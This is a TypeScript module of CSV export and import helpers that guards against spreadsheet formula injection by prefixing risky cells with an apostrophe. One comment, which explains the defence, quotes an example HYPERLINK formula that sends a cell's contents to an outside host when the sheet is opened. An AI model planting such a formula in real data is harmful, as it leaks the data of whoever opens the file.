/**
 * Minimal CSV helpers (semicolon separated, Excel/NL friendly).
 * Pure functions so they can be unit tested without a browser or server.
 */

/**
 * Characters that make a spreadsheet treat a cell as a formula rather than as
 * text. Tab and carriage return are here because Excel skips leading
 * whitespace before deciding, so "\t=1+1" is still a formula.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** A plain number, in either decimal notation. Never a formula. */
const NUMERIC = /^[+-]?\d+([.,]\d+)?$/;

/**
 * Neutralises a cell that a spreadsheet would otherwise run.
 *
 * Everything exported here is typed by someone else: customer names, delivery
 * notes, product names that arrived through a supplier import. A name of
 * `=HYPERLINK("http://elders/?x="&A1,"Klik")` is a working formula the moment a
 * colleague opens the export in Excel, and quoting does not stop it — Excel
 * drops the quotes and evaluates what is left.
 *
 * A leading apostrophe is the standard fix: spreadsheets read the rest of the
 * cell as literal text and do not show the apostrophe itself.
 */
function neutralise(value: string): string {
  if (!FORMULA_LEAD.test(value)) return value;
  // A negative amount starts with "-" and is not a formula. Prefixing it would
  // turn a revenue column into text and break every sum in the sheet, so plain
  // numbers are left exactly as they are.
  if (NUMERIC.test(value)) return value;
  return `'${value}`;
}

export function toCsv(rows: (string | number | null | undefined)[][], separator = ";"): string {
  return rows
    .map((row) =>
      row
        .map((cell) => {
          // Numbers are formatted by the caller and cannot carry a formula, but
          // they arrive as strings here, so they go through the same path.
          const text = neutralise(String(cell ?? ""));
          return `"${text.replace(/"/g, '""')}"`;
        })
        .join(separator),
    )
    .join("\r\n");
}

export function parseCsv(input: string, separator = ";"): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let inQuotes = false;

  const text = input.replace(/^\uFEFF/, "");

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];

    if (inQuotes) {
      if (char === '"') {
        if (text[i + 1] === '"') {
          cell += '"';
          i += 1;
        } else {
          inQuotes = false;
        }
      } else {
        cell += char;
      }
      continue;
    }

    if (char === '"') {
      inQuotes = true;
    } else if (char === separator) {
      row.push(cell.trim());
      cell = "";
    } else if (char === "\n") {
      row.push(cell.trim());
      cell = "";
      rows.push(row);
      row = [];
    } else if (char !== "\r") {
      cell += char;
    }
  }

  if (cell.length > 0 || row.length > 0) {
    row.push(cell.trim());
    rows.push(row);
  }

  return rows.filter((r) => r.some((c) => c.length > 0));
}

/**
 * Picks the delimiter from the header line.
 *
 * Dutch Excel exports use semicolons; most other tools use commas. Detecting it
 * means a customer's export imports either way instead of parsing as one giant
 * column.
 */
export function detectSeparator(input: string): string {
  const firstLine = input.replace(/^\uFEFF/, "").split(/\r?\n/, 1)[0] ?? "";
  const semicolons = (firstLine.match(/;/g) ?? []).length;
  const commas = (firstLine.match(/,/g) ?? []).length;
  const tabs = (firstLine.match(/\t/g) ?? []).length;
  if (tabs > semicolons && tabs > commas) return "\t";
  return commas > semicolons ? "," : ";";
}

export function csvToObjects(input: string, separator?: string): Record<string, string>[] {
  const rows = parseCsv(input, separator ?? detectSeparator(input));
  if (rows.length === 0) return [];
  const header = rows[0].map((h) => h.toLowerCase().trim());
  return rows.slice(1).map((row) => {
    const record: Record<string, string> = {};
    header.forEach((key, index) => {
      record[key] = row[index] ?? "";
    });
    return record;
  });
}

export function downloadCsv(filename: string, csv: string) {
  const blob = new Blob([`\uFEFF${csv}`], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  link.click();
  URL.revokeObjectURL(url);
}
